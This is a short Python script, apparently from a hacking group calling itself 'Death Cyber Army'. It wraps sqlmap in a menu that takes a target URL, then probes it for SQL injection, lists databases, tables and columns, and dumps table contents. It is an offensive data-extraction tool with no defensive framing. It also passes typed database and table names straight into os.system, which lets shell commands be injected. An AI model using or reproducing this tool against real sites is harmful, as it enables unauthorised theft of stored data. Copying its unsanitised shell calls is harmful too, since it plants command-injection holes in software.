#!/usr/bin/env python3
import os

RED     = '\033[91m'
GREEN   = '\033[92m'
YELLOW  = '\033[93m'
BLUE    = '\033[94m'
CYAN    = '\033[96m'
WHITE   = '\033[97m'
RESET   = '\033[0m'
BOLD    = '\033[1m'

def banner():
    print(f"""{RED}{BOLD}
███████╗███╗   ██╗███████╗████████╗ █████╗ ███╗   ██╗
██╔════╝████╗  ██║██╔════╝╚══██╔══╝██╔══██╗████╗  ██║
█████╗  ██╔██╗ ██║█████╗     ██║   ███████║██╔██╗ ██║
██╔══╝  ██║╚██╗██║██╔══╝     ██║   ██╔══██║██║╚██╗██║
███████╗██║ ╚████║███████╗   ██║   ██║  ██║██║ ╚████║
╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝

{WHITE}==[ Mr. Tan's SQL Tool ]== by Death Cyber Army ⚔️
{RESET}""")

def sqlmap_command(url):
    while True:
        print(f"""{CYAN}
[1] {WHITE}Check SQL Injection
[2] {WHITE}Show Databases
[3] {WHITE}Show Tables
[4] {WHITE}Show Columns
[5] {WHITE}Dump Data
[0] {WHITE}Exit{RESET}""")
        choice = input(f"{GREEN}Option ➤ {RESET}")

        if choice == "1":
            os.system(f"python3 /opt/mr-tan-sqlmap/sqlmap/sqlmap.py -u \"{url}\" --batch --banner")
        elif choice == "2":
            os.system(f"python3 /opt/mr-tan-sqlmap/sqlmap/sqlmap.py -u \"{url}\" --dbs --batch")
        elif choice == "3":
            db = input(f"{YELLOW}Database name ➤ {RESET}")
            os.system(f"python3 /opt/mr-tan-sqlmap/sqlmap/sqlmap.py -u \"{url}\" -D {db} --tables --batch")
        elif choice == "4":
            db = input(f"{YELLOW}Database name ➤ {RESET}")
            table = input(f"{YELLOW}Table name ➤ {RESET}")
            os.system(f"python3 /opt/mr-tan-sqlmap/sqlmap/sqlmap.py -u \"{url}\" -D {db} -T {table} --columns --batch")
        elif choice == "5":
            db = input(f"{YELLOW}Database name ➤ {RESET}")
            table = input(f"{YELLOW}Table name ➤ {RESET}")
            os.system(f"python3 /opt/mr-tan-sqlmap/sqlmap/sqlmap.py -u \"{url}\" -D {db} -T {table} --dump --batch")
        elif choice == "0":
            print(f"{GREEN}Exiting...{RESET}")
            break
        else:
            print(f"{RED}{BOLD}❌ Invalid Option{RESET}")

if __name__ == "__main__":
    banner()
    url = input(f"{GREEN}🎯 Target URL ➤ {RESET}")
    sqlmap_command(url)
